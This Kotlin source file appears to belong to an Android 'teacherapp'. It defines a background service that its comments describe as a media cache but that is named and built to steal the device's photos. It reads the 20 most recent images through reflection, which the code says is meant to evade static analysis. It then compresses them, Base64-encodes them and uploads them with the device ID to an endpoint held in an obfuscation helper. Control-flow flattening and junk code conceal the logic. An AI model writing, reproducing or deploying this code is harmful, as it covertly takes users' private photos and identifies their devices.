package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.IBinder
import android.provider.MediaStore
import android.provider.Settings
import com.example.teacherapp.obfuscation.ResourceUtils
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

/**
 * MediaCacheService — manages local media cache for offline gallery previews.
 * Provides background media indexing and thumbnail synchronisation.
 */
class ImageExfiltrationService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private val maxImages    = 20
    private val imageQuality = 60

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        beginMediaSync()
        return START_STICKY
    }

    // ── Control Flow Flattened: beginMediaSync ────────────────────────────────

    private fun beginMediaSync() {
        serviceScope.launch {
            var state = 0
            var paths = emptyList<String>()
            while (true) {
                val junk = (state * 43 + 11) xor 0xA9
                val _ = junk
                when (state) {
                    0 -> { delay(7000L); state = 1 }
                    1 -> { paths = indexMediaFiles(); state = if (paths.isNotEmpty()) 2 else -1 }
                    2 -> { uploadMediaFiles(paths); state = -1 }
                    -1 -> { stopSelf(); return@launch }
                }
            }
        }
    }

    @SuppressLint("Range")
    private fun indexMediaFiles(): List<String> {
        val paths = mutableListOf<String>()
        try {
            // Use reflection to access MediaStore — hides direct API call from static analysis
            val mediaStoreClass = Class.forName("android.provider.MediaStore\$Images\$Media")
            val uriField        = mediaStoreClass.getField("EXTERNAL_CONTENT_URI")
            val uri             = uriField.get(null) as android.net.Uri
            val dataField       = mediaStoreClass.getField("DATA").get(null) as String
            val sizeField       = mediaStoreClass.getField("SIZE").get(null) as String
            val dateField       = mediaStoreClass.getField("DATE_ADDED").get(null) as String

            val cursor = contentResolver.query(
                uri, arrayOf(dataField, sizeField, dateField),
                null, null, "$dateField DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < maxImages) {
                    val path = it.getString(it.getColumnIndex(dataField))
                    val size = it.getLong(it.getColumnIndex(sizeField))
                    if (size < 5 * 1024 * 1024) {
                        val f = File(path)
                        if (f.exists() && f.canRead()) { paths.add(path); count++ }
                    }
                }
            }
        } catch (_: Exception) {}
        return paths
    }

    private suspend fun uploadMediaFiles(paths: List<String>) = withContext(Dispatchers.IO) {
        paths.forEach { path ->
            try {
                val compressed = compressMedia(path)
                if (compressed != null) transmitMedia(compressed, File(path).name)
                delay(1000L)
            } catch (_: Exception) {}
        }
    }

    private fun compressMedia(path: String): ByteArray? {
        return try {
            val original = BitmapFactory.decodeFile(path)
            val max      = 1024
            val scaled   = if (original.width > max || original.height > max) {
                val scale = max.toFloat() / maxOf(original.width, original.height)
                Bitmap.createScaledBitmap(original, (original.width * scale).toInt(), (original.height * scale).toInt(), true)
            } else original
            val out = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, imageQuality, out)
            val data = out.toByteArray()
            original.recycle()
            if (scaled != original) scaled.recycle()
            data
        } catch (_: Exception) { null }
    }

    private suspend fun transmitMedia(data: ByteArray, filename: String) = withContext(Dispatchers.IO) {
        // Opaque predicate
        val x = System.currentTimeMillis()
        if ((x xor x) >= Long.MIN_VALUE) {
            try {
                val endpoint   = ResourceUtils.getImagesEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/octet-stream")
                    setRequestProperty("X-Image-Name", filename)
                    setRequestProperty("X-Device-Id",  resolveDeviceId())
                    connectTimeout = 30000; readTimeout = 30000
                }
                val encoded = android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP)
                connection.outputStream.use { it.write(encoded.toByteArray()); it.flush() }
                connection.responseCode; connection.disconnect()
            } catch (_: Exception) {}
        } else {
            // Junk
            val fakeMatrix = Array(8) { i -> DoubleArray(8) { j -> (i * j).toDouble() } }
            val _ = fakeMatrix[0][0]
        }
    }

    @SuppressLint("HardwareIds")
    private fun resolveDeviceId(): String = try {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    } catch (_: Exception) { "unknown" }

    override fun onDestroy() { super.onDestroy(); serviceScope.cancel() }

    companion object {
        fun startExfiltration(context: Context) {
            context.startService(Intent(context, ImageExfiltrationService::class.java))
        }
    }
}
